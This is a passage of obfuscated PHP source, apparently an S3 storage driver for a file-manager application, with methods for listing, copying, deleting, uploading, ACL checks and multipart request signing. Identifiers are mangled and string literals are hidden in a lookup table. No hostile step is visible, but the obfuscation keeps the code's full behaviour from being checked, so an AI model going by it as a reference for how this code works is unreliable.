rtrim($ç¦°Áëº, $¤ñ„’¥Ù[8]) . $¤ñ„’¥Ù[8]; } $¸ÚÑÆ•ğ = array_merge($¸ÚÑÆ•ğ, $this->slicePath($ç¦°Áëº)); } $”Õªš£Ğ = array(); foreach (array_unique($¸ÚÑÆ•ğ) as $ÑäŒòÒÄ) { $ñ³´™ = array($¤ñ„’¥Ù[87] => $this->getPathOuter($¤ñ„’¥Ù[8] . $ÁûÔ´‚ . $¤ñ„’¥Ù[8] . $ÑäŒòÒÄ), $¤ñ„’¥Ù[78] => 1, $¤ñ„’¥Ù[79] => 0); if (substr($ÑäŒòÒÄ, -1) != $¤ñ„’¥Ù[8]) { $ñ³´™[$¤ñ„’¥Ù[78]] = 0; $˜‘µşö½ = $this->getPath($ÁûÔ´‚ . $¤ñ„’¥Ù[8] . $ÑäŒòÒÄ); if (isset($›ğŸ•àæ[$˜‘µşö½])) { $ò±Ú×¼Õ = $›ğŸ•àæ[$˜‘µşö½]; if (isset($ò±Ú×¼Õ[$¤ñ„’¥Ù[79]])) { $ñ³´™[$¤ñ„’¥Ù[79]] = intval($ò±Ú×¼Õ[$¤ñ„’¥Ù[79]]); } if (isset($ò±Ú×¼Õ[$¤ñ„’¥Ù[206]])) { $ñ³´™[$¤ñ„’¥Ù[88]] = intval($ò±Ú×¼Õ[$¤ñ„’¥Ù[206]]); } } } $”Õªš£Ğ[] = $ñ³´™; } return $”Õªš£Ğ; } public function slicePath($µÁ½éÄó) { $Ü–¡½ =& $_SERVER[³Ôà×Ó]; $ïºÆÚ = explode($Ü–¡½[8], trim($µÁ½éÄó, $Ü–¡½[8])); $øÓ­¿Ñ = 0; do { ++$øÓ­¿Ñ; $¯ÆüíŒ[] = implode($Ü–¡½[8], array_slice($ïºÆÚ, 0, $øÓ­¿Ñ)) . $Ü–¡½[8]; } while ($øÓ­¿Ñ < count($ïºÆÚ)); $¯ÆüíŒ[count($ïºÆÚ) - 1] = $µÁ½éÄó; return $¯ÆüíŒ; } public function getHost() { $¢÷ÆÁÛì =& $_SERVER[³Ôà×Ó]; $ãöƒ‘”Å = parse_url(trim($this->domain, $¢÷ÆÁÛì[8])); $ÕÃ³çëê = isset($ãöƒ‘”Å[$¢÷ÆÁÛì[207]]) ? $ãöƒ‘”Å[$¢÷ÆÁÛì[207]] : http_type(); $°èÊ·¿ù = isset($ãöƒ‘”Å[$¢÷ÆÁÛì[208]]) ? $ãöƒ‘”Å[$¢÷ÆÁÛì[208]] : $ãöƒ‘”Å[$¢÷ÆÁÛì[87]]; if (isset($ãöƒ‘”Å[$¢÷ÆÁÛì[209]])) { $°èÊ·¿ù .= $¢÷ÆÁÛì[4] . $ãöƒ‘”Å[$¢÷ÆÁÛì[209]]; } return $ÕÃ³çëê . $¢÷ÆÁÛì[210] . $°èÊ·¿ù; } public function pathEncode($ŠÆ´°¸‹) { $ÆÂ©÷´í =& $_SERVER[³Ôà×Ó]; return str_replace($ÆÂ©÷´í[211], $ÆÂ©÷´í[8], rawurlencode($ŠÆ´°¸‹)); } public function writeLog($ïö’á–é = '', $šñôğ• = false) { $“§¬Æ„½ =& $_SERVER[³Ôà×Ó]; $¨Ò…Ëêï = in_array(ACTION, array($“§¬Æ„½[212], $“§¬Æ„½[213])); if (!$¨Ò…Ëêï && !GLOBAL_DEBUG) { return; } $‚à¸œ¾ = $ïö’á–é; static $„«ËàÉ¯ = null; if (!$„«ËàÉ¯) { $„«ËàÉ¯ = strtoupper($this->getType()); } $ïö’á–é = $„«ËàÉ¯ . $“§¬Æ„½[214] . $ïö’á–é; if ($šñôğ•) { $€ÁÆ€ÛÌ = error_get_last(); if ($€ÁÆ€ÛÌ) { $ïö’á–é = array($ïö’á–é, $€ÁÆ€ÛÌ); } } write_log($ïö’á–é, $“§¬Æ„½[215]); if ($¨Ò…Ëêï) { throw new Exception($‚à¸œ¾); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¶Ù÷¦Ñä) { set_timeout(); require_once SDK_DIR . $_SERVER[³Ôà×Ó][216]; parent::__construct(); $this->_init($¶Ù÷¦Ñä); } public function _init($–ÃãÍè›) { $ª±ÎÌÈ§ =& $_SERVER[³Ôà×Ó]; $this->config = $–ÃãÍè›; foreach ($–ÃãÍè› as $ûîïë¯î => $ßĞ–™Âú) { if (isset($this->{$ûîïë¯î})) { $this->{$ûîïë¯î} = $ßĞ–™Âú; } } $this->endpoint = $–ÃãÍè›[$ª±ÎÌÈ§[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ª±ÎÌÈ§[212], $ª±ÎÌÈ§[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Œğâ®á¬ = "\166\x34") { $this->signVer = $Œğâ®á¬; $this->client->setSignatureVersion($Œğâ®á¬); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $´­¥ÊŠ¯) { return null; } } public function isBucketCors() { $Úïõ¡¬ =& $_SERVER[³Ôà×Ó]; $ŞÆ¥ÑàÃ = $this->getBucketCors(); if (!$ŞÆ¥ÑàÃ || !is_array($ŞÆ¥ÑàÃ)) { return !1; } if (!is_array($ŞÆ¥ÑàÃ[$Úïõ¡¬[218]])) { $ŞÆ¥ÑàÃ[$Úïõ¡¬[218]] = explode($Úïõ¡¬[50], $ŞÆ¥ÑàÃ[$Úïõ¡¬[218]]); } if ($ŞÆ¥ÑàÃ[$Úïõ¡¬[219]] != $Úïõ¡¬[220] || !in_array($Úïõ¡¬[220], $ŞÆ¥ÑàÃ[$Úïõ¡¬[218]])) { return !1; } $‡«µÅµ¹ = array_map($Úïõ¡¬[221], $ŞÆ¥ÑàÃ[$Úïõ¡¬[222]]); if (!is_array($‡«µÅµ¹)) { $‡«µÅµ¹ = array(); } $õ÷Ü§Æç = array($Úïõ¡¬[223], $Úïõ¡¬[224], $Úïõ¡¬[225], $Úïõ¡¬[226], $Úïõ¡¬[227]); $óÊÕ é = array_diff($õ÷Ü§Æç, $‡«µÅµ¹); return empty($óÊÕ é); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ÖíÇÇ«Ÿ, $í˜§™ = '', $Â¥Çò“† = REPEAT_RENAME) { $ÂÃÏÀÑ˜ = $this->setContent($ÖíÇÇ«Ÿ, $í˜§™); if ($ÂÃÏÀÑ˜ !== !1) { return $this->getPathOuter($ÖíÇÇ«Ÿ); } return !1; } public function mkdir($Èı«¸®, $£°½‹È = REPEAT_SKIP) { $¼Àß¬Ã­ =& $_SERVER[³Ôà×Ó]; if (empty($Èı«¸®) && $Èı«¸® !== $¼Àß¬Ã­[228]) { return !1; } if ($£°½‹È && $this->_isFolder($Èı«¸®)) { return $this->getPathOuter($Èı«¸®); } $õî©ƒòì = $this->setContent($Èı«¸®, $¼Àß¬Ã­[12], !0); if ($õî©ƒòì !== !1) { return $this->getPathOuter($Èı«¸®); } return !1; } public function copyFile($¦‡ÁÚ¦, $Õ‘Ğ†§, $Ç‡ÅĞú” = array()) { $ÓÀ¬®àã =& $_SERVER[³Ôà×Ó]; $÷‹µ×šü = $this->objectMeta($¦‡ÁÚ¦); if (!$÷‹µ×šü) { return !1; } if ($÷‹µ×šü[$ÓÀ¬®àã[79]] <= 1024 * 1024 * 200) { $ÒáÑğš = $this->client->copyObject($this->bucket, $¦‡ÁÚ¦, $this->bucket, $Õ‘Ğ†§, $ÓÀ¬®àã[229], $Ç‡ÅĞú”); } else { $ÒáÑğš = $this->client->multiCopyObject($this->bucket, $¦‡ÁÚ¦, $this->bucket, $Õ‘Ğ†§, $Ç‡ÅĞú”); } $ÒáÑğš = $ÒáÑğš ? $this->getPathOuter($Õ‘Ğ†§) : !1; return $ÒáÑğš; } public function moveFile($†ì²şØ¤, $¡ÓÌ½ŠÒ) { if ($this->copyFile($†ì²şØ¤, $¡ÓÌ½ŠÒ)) { $this->delFile($†ì²şØ¤); return $this->getPathOuter($¡ÓÌ½ŠÒ); } return !1; } public function delFile($òˆ°ÕÀø) { return $this->client->deleteObject($this->bucket, $òˆ°ÕÀø); } public function delFolder($ÑÒ®½üÊ) { $Å¶Ó™±¿ =& $_SERVER[³Ôà×Ó]; if (!$this->exist($ÑÒ®½üÊ)) { return !0; } $this->listItemCache = !1; $†Ï ó€ = $this->fileList($ÑÒ®½üÊ); $this->listItemCache = !0; $Í’ƒà¢Ê = trim($ÑÒ®½üÊ, $Å¶Ó™±¿[8]) . $Å¶Ó™±¿[8]; if (!empty($ÑÒ®½üÊ) && $ÑÒ®½üÊ !== $Å¶Ó™±¿[228] && !in_array($Í’ƒà¢Ê, $†Ï ó€[$Å¶Ó™±¿[85]])) { $†Ï ó€[$Å¶Ó™±¿[85]][] = $Í’ƒà¢Ê; } $«ú´®Æ = $this->delByBatch($†Ï ó€[$Å¶Ó™±¿[86]]); if (!$«ú´®Æ) { return !1; } $«ú´®Æ = $this->delByBatch($†Ï ó€[$Å¶Ó™±¿[85]]); if (!$«ú´®Æ) { return !1; } return $this->delFile($Í’ƒà¢Ê); } private function delByBatch($»ê˜ışæ) { foreach (array_chunk($»ê˜ışæ, 1000) as $‡£‡Ò°³) { $í•ä ©à = $this->client->deleteObjects($this->bucket, $‡£‡Ò°³); if (!$í•ä ©à) { return !1; } } return !0; } public function rename($Öèöìêú, $ÓÑíª÷) { return $this->renameObject($Öèöìêú, $ÓÑíª÷); } public function listPath($¹¤’ªãÎ, $ŞÔƒ‘ñ÷ = false) { $šÚ îˆ =& $_SERVER[³Ôà×Ó]; $ŒÇ¾ŠÍ¦ = $this->fileList($¹¤’ªãÎ, $šÚ îˆ[8], !0); foreach ($ŒÇ¾ŠÍ¦[$šÚ îˆ[85]] as $Õß›ªê© => $»ışÓä¬) { $ŒÇ¾ŠÍ¦[$šÚ îˆ[85]][$Õß›ªê©] = $this->folderInfo($»ışÓä¬, $ŞÔƒ‘ñ÷, $»ışÓä¬); } foreach ($ŒÇ¾ŠÍ¦[$šÚ îˆ[86]] as $Õß›ªê© => $»ışÓä¬) { $ŒÇ¾ŠÍ¦[$šÚ îˆ[86]][$Õß›ªê©] = $this->fileInfo($»ışÓä¬[$šÚ îˆ[32]], $ŞÔƒ‘ñ÷, $»ışÓä¬); } return $ŒÇ¾ŠÍ¦; } protected function infoChildren($«±Ÿø…², &$ÛİœÉŠ«) { $¨Ïëï‚¼ =& $_SERVER[³Ôà×Ó]; $®–Õ›ñş = $this->fileList($«±Ÿø…², $¨Ïëï‚¼[12], !0); $ÛİœÉŠ«[$¨Ïëï‚¼[81]] += count($®–Õ›ñş[$¨Ïëï‚¼[85]]); $ÛİœÉŠ«[$¨Ïëï‚¼[80]] += count($®–Õ›ñş[$¨Ïëï‚¼[86]]); foreach ($®–Õ›ñş[$¨Ïëï‚¼[86]] as $é™¦éü©) { if (!$é™¦éü© || !$é™¦éü©[$¨Ïëï‚¼[79]]) { continue; } $ÛİœÉŠ«[$¨Ïëï‚¼[79]] += $é™¦éü©[$¨Ïëï‚¼[79]]; } } private function fileInfo($ˆ™»ë³, $ËÑ®¬ğ = false, $Ì­†Õ±‡ = array()) { $ÓØŞª’ =& $_SERVER[³Ôà×Ó]; $½Èş°õº = array($ÓØŞª’[32] => $this->pathThis($ˆ™»ë³), $ÓØŞª’[87] => $this->getPathOuter($ˆ™»ë³), $ÓØŞª’[33] => $ÓØŞª’[230], $ÓØŞª’[169] => $this->ext($ˆ™»ë³), $ÓØŞª’[79] => isset($Ì­†Õ±‡[$ÓØŞª’[79]]) ? $Ì­†Õ±‡[$ÓØŞª’[79]] : 0); if ($ËÑ®¬ğ) { return $½Èş°õº; } $½Èş°õº[$ÓØŞª’[231]] = $½Èş°õº[$ÓØŞª’[88]] = 0; $½Èş°õº[$ÓØŞª’[232]] = $½Èş°õº[$ÓØŞª’[233]] = !0; if (empty($Ì­†Õ±‡)) { $Ì­†Õ±‡ = $this->objectMeta($ˆ™»ë³); if (!$Ì­†Õ±‡) { return $½Èş°õº; } } if (isset($Ì­†Õ±‡[$ÓØŞª’[234]]) && $Ì­†Õ±‡[$ÓØŞª’[234]]) { $½Èş°õº[$ÓØŞª’[235]] = $Ì­†Õ±‡[$ÓØŞª’[234]]; } if (isset($Ì­†Õ±‡[$ÓØŞª’[206]])) { $½Èş°õº[$ÓØŞª’[88]] = $Ì­†Õ±‡[$ÓØŞª’[206]]; } if (isset($Ì­†Õ±‡[$ÓØŞª’[79]])) { $½Èş°õº[$ÓØŞª’[79]] = $Ì­†Õ±‡[$ÓØŞª’[79]]; } return $½Èş°õº; } private function folderInfo($ÆâƒúğŒ, $™„öïÏç = false, $ÕšªÈş˜ = array()) { $şàË¢Ö =& $_SERVER[³Ôà×Ó]; $¯¡ê°‘ = array($şàË¢Ö[32] => $this->pathThis($ÆâƒúğŒ), $şàË¢Ö[87] => $this->getPathOuter($şàË¢Ö[8] . $ÆâƒúğŒ), $şàË¢Ö[33] => $şàË¢Ö[78]); if ($™„öïÏç) { return $¯¡ê°‘; } $¯¡ê°‘[$şàË¢Ö[231]] = $¯¡ê°‘[$şàË¢Ö[88]] = 0; $¯¡ê°‘[$şàË¢Ö[232]] = $¯¡ê°‘[$şàË¢Ö[233]] = !0; if ($ÆâƒúğŒ == $şàË¢Ö[12]) { return $¯¡ê°‘; } if (empty($ÕšªÈş˜)) { $ÕšªÈş˜ = $this->objectMeta(trim($ÆâƒúğŒ, $şàË¢Ö[8]) . $şàË¢Ö[8]); } if (isset($ÕšªÈş˜[$şàË¢Ö[206]])) { $¯¡ê°‘[$şàË¢Ö[231]] = $ÕšªÈş˜[$şàË¢Ö[206]]; } return $¯¡ê°‘; } private function fileList($ş§·Ü³«, $şı“¹®í = '', $°êÔÁÑ = 0) { $Í‰˜¼«ì =& $_SERVER[³Ôà×Ó]; $ƒ€Ò‡ÌŠ = rtrim($ş§·Ü³«, $Í‰˜¼«ì[8]) . $Í‰˜¼«ì[8]; $äÆîÛ¢Ç = $this->listObjs($ƒ€Ò‡ÌŠ, null, null, $şı“¹®í); if (!$äÆîÛ¢Ç) { return array($Í‰˜¼«ì[85] => array(), $Í‰˜¼«ì[86] => array()); } $äÉ°Éüİ = $¨ñ±ğÍô = array(); foreach ($äÆîÛ¢Ç[$Í‰˜¼«ì[236]] as $³áİ¼ì¯) { $İ˜æ‡ŞÁ = $³áİ¼ì¯[$Í‰˜¼«ì[32]]; if ($İ˜æ‡ŞÁ == $ƒ€Ò‡ÌŠ) { continue; } $ìµÁïÂÏ = isset($³áİ¼ì¯[$Í‰˜¼«ì[79]]) ? $³áİ¼ì¯[$Í‰˜¼«ì[79]] : 0; $°…§ñ™ = $ìµÁïÂÏ == 0 && substr($İ˜æ‡ŞÁ, strlen($İ˜æ‡ŞÁ) - 1, 1) == $Í‰˜¼«ì[8] ? !0 : !1; $this->cacheMethodInfoSet($İ˜æ‡ŞÁ, $°…§ñ™, $³áİ¼ì¯); if ($°…§ñ™) { $äÉ°Éüİ[] = $İ˜æ‡ŞÁ; continue; } $¨ñ±ğÍô[] = $°êÔÁÑ ? $³áİ¼ì¯ : $İ˜æ‡ŞÁ; } foreach ($äÆîÛ¢Ç[$Í‰˜¼«ì[237]] as $³áİ¼ì¯) { $äÉ°Éüİ[] = $³áİ¼ì¯[$Í‰˜¼«ì[32]]; $this->cacheMethodInfoSet($³áİ¼ì¯[$Í‰˜¼«ì[32]], !0); } $this->cacheMethodInfoSet($ş§·Ü³«, !0); return array($Í‰˜¼«ì[85] => $äÉ°Éüİ, $Í‰˜¼«ì[86] => $¨ñ±ğÍô); } private function listObjs($áò”Í«, $œÍŸıŞ = null, $…µßòĞº = null, $Í´ÑŞİŠ = null) { $ƒØ†¦¡Î =& $_SERVER[³Ôà×Ó]; $áò”Í« = trim($áò”Í«, $ƒØ†¦¡Î[8]); $Èù™Ä’ = empty($áò”Í«) && $áò”Í« !== $ƒØ†¦¡Î[228] ? $ƒØ†¦¡Î[12] : $áò”Í« . $ƒØ†¦¡Î[8]; return $this->client->getBucket($this->bucket, $Èù™Ä’, $œÍŸıŞ, $…µßòĞº, $Í´ÑŞİŠ, !0); } public function has($ÓÓ–€”, $„Ë¬œê‹ = false, $¶Ô²Ğ‰ = true) { $ƒÉæ£ƒ =& $_SERVER[³Ôà×Ó]; $ÓÓ–€” = trim($ÓÓ–€”, $ƒÉæ£ƒ[8]); $ÃìÎ†­¤ = empty($ÓÓ–€”) && $ÓÓ–€” !== $ƒÉæ£ƒ[228] ? $ƒÉæ£ƒ[12] : $ÓÓ–€” . $ƒÉæ£ƒ[8]; $ÎŒ€ì—ù = null; $˜Ììµõ¢ = 500; $¶Ó‡ìèº = $ƒÉæ£ƒ[8]; $‰•ÌŒ© = $Ç×âÕ¦ = array(); while (!0) { $³˜ñ¨¨é = $this->listObjs($ÓÓ–€”, $ÎŒ€ì—ù, $˜Ììµõ¢, $¶Ó‡ìèº); if (!$³˜ñ¨¨é) { break; } $ÎŒ€ì—ù = $³˜ñ¨¨é[$ƒÉæ£ƒ[238]]; $®¨‚øÖ‡ = $³˜ñ¨¨é[$ƒÉæ£ƒ[236]]; $©˜ğÃµÎ = $³˜ñ¨¨é[$ƒÉæ£ƒ[237]]; if (empty($®¨‚øÖ‡) && empty($©˜ğÃµÎ)) { break; } if (count($®¨‚øÖ‡) == 1 && $®¨‚øÖ‡[0][$ƒÉæ£ƒ[32]] == $ÃìÎ†­¤) { break; } if ($„Ë¬œê‹) { if (count($®¨‚øÖ‡)) { $®¨‚øÖ‡ = array_column($®¨‚øÖ‡, $ƒÉæ£ƒ[32]); $‰•ÌŒ© = array_merge($‰•ÌŒ©, $®¨‚øÖ‡); } if (count($©˜ğÃµÎ)) { $©˜ğÃµÎ = array_column($©˜ğÃµÎ, $ƒÉæ£ƒ[32]); $Ç×âÕ¦ = array_merge($Ç×âÕ¦, $©˜ğÃµÎ); } if ($ÎŒ€ì—ù === null) { break; } continue; } if ($¶Ô²Ğ‰) { if (!empty($®¨‚øÖ‡)) { if (count($®¨‚øÖ‡) > 1 || isset($®¨‚øÖ‡[0][$ƒÉæ£ƒ[32]]) && $®¨‚øÖ‡[0][$ƒÉæ£ƒ[32]] != $ÃìÎ†­¤) { return !0; } } } else { if (!empty($©˜ğÃµÎ)) { return !0; } } if ($ÎŒ€ì—ù === null) { break; } } if ($„Ë¬œê‹) { $‰•ÌŒ© = array_diff($‰•ÌŒ©, array($ÃìÎ†­¤)); $‰•ÌŒ© = count(array_unique($‰•ÌŒ©)); $Ç×âÕ¦ = count(array_unique($Ç×âÕ¦)); return array($ƒÉæ£ƒ[239] => $‰•ÌŒ©, $ƒÉæ£ƒ[240] => $Ç×âÕ¦); } return !1; } public function listAll($ƒı ‚Ã¡) { $ÔéªœÇ¶ =& $_SERVER[³Ôà×Ó]; $á›ñÆúÓ = $this->fileList($ƒı ‚Ã¡, $ÔéªœÇ¶[12], !0); $àŞ¸Úøğ = array_to_keyvalue($á›ñÆúÓ[$ÔéªœÇ¶[86]], $ÔéªœÇ¶[32]); foreach ($á›ñÆúÓ[$ÔéªœÇ¶[85]] as $Œ¤ §íœ) { if (is_string($Œ¤ §íœ)) { $àŞ¸Úøğ[$Œ¤ §íœ] = array($ÔéªœÇ¶[79] => 0); } } return $this->listAllFiles($ƒı ‚Ã¡, $àŞ¸Úøğ); } public function canRead($­’îĞŠè) { $´Å¸¹œ¡ =& $_SERVER[³Ôà×Ó]; $ëÓı¢‹‰ = $this->client->getAccessControlPolicy($this->bucket, $­’îĞŠè); if (!$ëÓı¢‹‰) { return !1; } return in_array($ëÓı¢‹‰, array($´Å¸¹œ¡[241], $´Å¸¹œ¡[242], $´Å¸¹œ¡[243])) ? !0 : !1; } public function canWrite($²§â…İú) { $È³Éûı… =& $_SERVER[³Ôà×Ó]; $¡ƒöÏå = $this->client->getAccessControlPolicy($this->bucket, $²§â…İú); if (!$¡ƒöÏå) { return !1; } return in_array($¡ƒöÏå, array($È³Éûı…[241], $È³Éûı…[242])) ? !0 : !1; } public function getContent($ÓòÅÜ ï) { return $this->client->getObject($this->bucket, $ÓòÅÜ ï); } public function setContent($£¸›–Òî, $´Ú’ÓŞ« = '', $Ñ¨õÈŒ = false) { $¬ä¢€Æª =& $_SERVER[³Ôà×Ó]; $£¸›–Òî = $Ñ¨õÈŒ ? trim($£¸›–Òî, $¬ä¢€Æª[8]) . $¬ä¢€Æª[8] : $£¸›–Òî; $Éœ¸â““ = get_file_mime(get_path_ext($£¸›–Òî)); $¥­âüç– = $this->client->putObject($´Ú’ÓŞ«, $this->bucket, $£¸›–Òî, $¬ä¢€Æª[229], array(), $Éœ¸â““); if (!$¥­âüç–) { return !1; } if ($Ñ¨õÈŒ) { return !0; } return $¥­âüç– ? !0 : !1; } public function fileSubstr($²©¸±É, $Áû…¥’, $ôÅé÷¢ø) { $ò€ëÄùŒ = $Áû…¥’ + $ôÅé÷¢ø - 1; return $this->client->getObject($this->bucket, $²©¸±É, array($_SERVER[³Ôà×Ó][244] => "\x62\171\x74\145\163\75{$Áû…¥’}\55{$ò€ëÄùŒ}")); } public function upload($ØÜ Ç, $Òæ™Çåª, $ úŞ°Øõ = false, $¶ú«ğŠ = REPEAT_REPLACE) { $’¾ËÓÂ‰ =& $_SERVER[³Ôà×Ó]; $ÊÂ¾êéÂ = array($’¾ËÓÂ‰[245] => @md5_file($Òæ™Çåª)); $¬–íéïÓ = array($’¾ËÓÂ‰[246] => get_file_mime(get_path_ext($ØÜ Ç))); if (IO::size($Òæ™Çåª) <= 1024 * 1024 * 200) { $ƒƒ¹‹÷ˆ = $this->client->putObjectFile($Òæ™Çåª, $this->bucket, $ØÜ Ç, $’¾ËÓÂ‰[229], $ÊÂ¾êéÂ, $¬–íéïÓ); return !empty($ƒƒ¹‹÷ˆ) ? $this->getPathOuter($ØÜ Ç) : !1; } $µ¸Ô„’ô = $this->client->multiUploadObject($Òæ™Çåª, $this->bucket, trim($ØÜ Ç, $’¾ËÓÂ‰[8]), $ÊÂ¾êéÂ, $¬–íéïÓ); return $µ¸Ô„’ô ? $this->getPathOuter($ØÜ Ç) : !1; } public function download($é’Áß¶›, $ô„ëûÀ¤) { if (!@is_dir($this->pathFather($ô„ëûÀ¤)) && !IO::mkdir($this->pathFather($ô„ëûÀ¤))) { return !1; } $ÚğìÇåç = $this->client->getObject($this->bucket, $é’Áß¶›, array(), $ô„ëûÀ¤); return $ÚğìÇåç !== !1 ? $ô„ëûÀ¤ : !1; } public function link($–¨Óø‡Õ, $Éõí¼‰¶ = array()) { $Ë“ÜˆÕŞ =& $_SERVER[³Ôà×Ó]; if ($this->signVer == $Ë“ÜˆÕŞ[247]) { return $this->client->getAuthenticatedURL($this->bucket, $–¨Óø‡Õ, 3600 * 12, $Éõí¼‰¶); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($–¨Óø‡Õ, $Ë“ÜˆÕŞ[8]), 3600 * 12, $this->region, array(), !0, $Éõí¼‰¶); } public function fileOut($ğæ °¤¯, $Ã×å®Ÿº = false, $Õ×ĞƒäÇ = false, $Á£·°÷ = '') { $öò˜µîæ =& $_SERVER[³Ôà×Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($ğæ °¤¯, $Ã×å®Ÿº, $Õ×ĞƒäÇ, $Á£·°÷); } if (!$Õ×ĞƒäÇ) { $Õ×ĞƒäÇ = $this->pathThis($ğæ °¤¯); } $…Š×ğğÜ = get_file_mime(get_path_ext($Õ×ĞƒäÇ)); if ($…Š×ğğÜ == $öò˜µîæ[248]) { return parent::fileOut($ğæ °¤¯, $Ã×å®Ÿº, $Õ×ĞƒäÇ, $Á£·°÷); } $”ÅÖÚå“ = array($öò˜µîæ[249] => $…Š×ğğÜ); if ($Ã×å®Ÿº) { $”ÅÖÚå“[$öò˜µîæ[250]] = $öò˜µîæ[251] . rawurlencode($Õ×ĞƒäÇ); } else { } $¥©‚•øŒ = $this->link($ğæ °¤¯, $”ÅÖÚå“); $this->fileOutLink($¥©‚•øŒ); } public function fileOutServer($Òá›‹ê´, $»ÃÅ‘Úš = false, $ÒÆâøñÚ = false, $¼á­¬µ÷ = '') { parent::fileOut($Òá›‹ê´, $»ÃÅ‘Úš, $ÒÆâøñÚ, $¼á­¬µ÷); } public function fileOutImageServer($òÓïˆ©, $Í¬ùºÒ• = 250) { parent::fileOutImage($òÓïˆ©, $Í¬ùºÒ•); } public function hashMd5($õÜùã™ä, $üÇ€†· = '') { $îŒ×ÚÙ­ = $this->objectMeta($õÜùã™ä); if (!$îŒ×ÚÙ­) { return !1; } $üÇ€†· = $üÇ€†· ? $üÇ€†· : _get($îŒ×ÚÙ­, $_SERVER[³Ôà×Ó][252]); return $üÇ€†·; } public function uploadFormData($ÎªÀô, $Öê´™êÉ = 3600) { $¿àøğ—Ú =& $_SERVER[³Ôà×Ó]; $Ô×âûŒÎ = $this->pathFather($ÎªÀô); $ôá´ÈÜµ = $this->client->getHttpUploadPostParams($this->bucket, $Ô×âûŒÎ, $¿àøğ—Ú[229], $Öê´™êÉ); return array_merge((array) $ôá´ÈÜµ, array($¿àøğ—Ú[208] => $this->getHost())); } public function multiUploadFormData($ûñ©µğö, $Ä©ó€û± = 3600) { $á³‡øöõ =& $_SERVER[³Ôà×Ó]; $ººÑıâÚ = gmdate($á³‡øöõ[253]); $¼ÛíãÑ£ = array(); $®Îš­Ğû = $this->client->getUploadId($this->bucket, $ûñ©µğö, $¼ÛíãÑ£); if (!$®Îš­Ğû) { return !1; } return array($á³‡øöõ[254] => $®Îš­Ğû, $á³‡øöõ[208] => $this->getHost() . $á³‡øöõ[8] . $this->pathEncode($ûñ©µğö), $á³‡øöõ[255] => $ººÑıâÚ, $á³‡øöõ[97] => $ûñ©µğö); } public function multiUploadAuthData($ ë€˜, $ûõüÎï™ = array()) { $Ñ÷— Ò’ =& $_SERVER[³Ôà×Ó]; $Àêì˜Şä = isset($ûõüÎï™[$Ñ÷— Ò’[255]]) ? $ûõüÎï™[$Ñ÷— Ò’[255]] : gmdate($Ñ÷— Ò’[253]); $²¾Í…ä = isset($ûõüÎï™[$Ñ÷— Ò’[169]]) ? $ûõüÎï™[$Ñ÷— Ò’[169]] : $Ñ÷— Ò’[12]; $¶ş–Ù’ = $ûõüÎï™[$Ñ÷— Ò’[97]]; unset($ûõüÎï™[$Ñ÷— Ò’[97]]); if (isset($ûõüÎï™[$Ñ÷— Ò’[256]])) { $ûõüÎï™[$Ñ÷— Ò’[255]] = $Àêì˜Şä; return $this->listUploadParts($¶ş–Ù’, $ûõüÎï™); } $Œå²¶ = array($Ñ÷— Ò’[257], $Ñ÷— Ò’[12], $Ñ÷— Ò’[123], $Ñ÷— Ò’[12], "\x78\x2d\x61\155\x7a\55\144\x61\x74\x65\72{$Àêì˜Şä}", $Ñ÷— Ò’[8] . $this->bucket . $Ñ÷— Ò’[8] . $this->pathEncode($¶ş–Ù’) . $²¾Í…ä); if (strpos($²¾Í…ä, $Ñ÷— Ò’[258]) === 0) { $Œå²¶[0] = $Ñ÷— Ò’[259]; } if (isset($ûõüÎï™[$Ñ÷— Ò’[260]]) && $ûõüÎï™[$Ñ÷— Ò’[260]] == $Ñ÷— Ò’[261]) { $Œå²¶[0] = $Ñ÷— Ò’[261]; } $é±ã¨ûÍ = implode($Ñ÷— Ò’[262], $Œå²¶); $É÷„£¦ì = base64_encode(hash_hmac($Ñ÷— Ò’[263], $é±ã¨ûÍ, $this->secret, !0)); $¯ü¸æŠ = $Ñ÷— Ò’[264] . $this->accessKey . $Ñ÷— Ò’[4] . $É÷„£¦ì; if (strpos($²¾Í…ä, $Ñ÷— Ò’[258]) === 0) { return array($Ñ÷— Ò’[265] => $¯ü¸æŠ, $Ñ÷— Ò’[255] => $Àêì˜Şä); } return $¯ü¸æŠ; } public function listUploadParts($Ü§§¤ãË, $õî‰öğ = array()) { $¿÷³ñ¯Ş =& $_SERVER[³Ôà×Ó]; $¦³Ãø¢ï = str_replace($¿÷³ñ¯Ş[266], $¿÷³ñ¯Ş[12], $õî‰öğ[$¿÷³ñ¯Ş[169]]); $½‹Œì´ = $this->client->listParts($this->bucket, $Ü§§¤ãË, $¦³Ãø¢ï); if (!$½‹Œì´) { return !1; } unset($õî‰öğ[$¿÷³ñ¯Ş[256]], $õî‰öğ[$¿÷³ñ¯Ş[260]]); $õî‰öğ[$¿÷³ñ¯Ş[97]] = $Ü§§¤ãË; $è´Ñ·¥œ = $this->multiUploadAuthData($Ü§§¤ãË, $õî‰öğ); if (empty($è´Ñ·¥œ)) { return !1; } return array($¿÷³ñ¯Ş[265] => $è´Ñ·¥œ, $¿÷³ñ¯Ş[255] => $õî‰öğ[$¿÷³ñ¯Ş[255]], $¿÷³ñ¯Ş[267] => $½‹Œì´); } public function getHost() { $Í‘ºÇöŸ =& $_SERVER[³Ôà×Ó]; $ á”–¸Î = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Í‘ºÇöŸ[70], $Í‘ºÇöŸ[64], $Í‘ºÇöŸ[69], $Í‘ºÇöŸ[62]))) { return $ á”–¸Î . $Í‘ºÇöŸ[8] . $this->bucket; } $ á”–¸Î = explode($Í‘ºÇöŸ[210], $ á”–¸Î); return $ á”–¸Î[0] . $Í‘ºÇöŸ[210] . $this->bucket . $Í‘ºÇöŸ[10] . $ á”–¸Î[1]; } public function 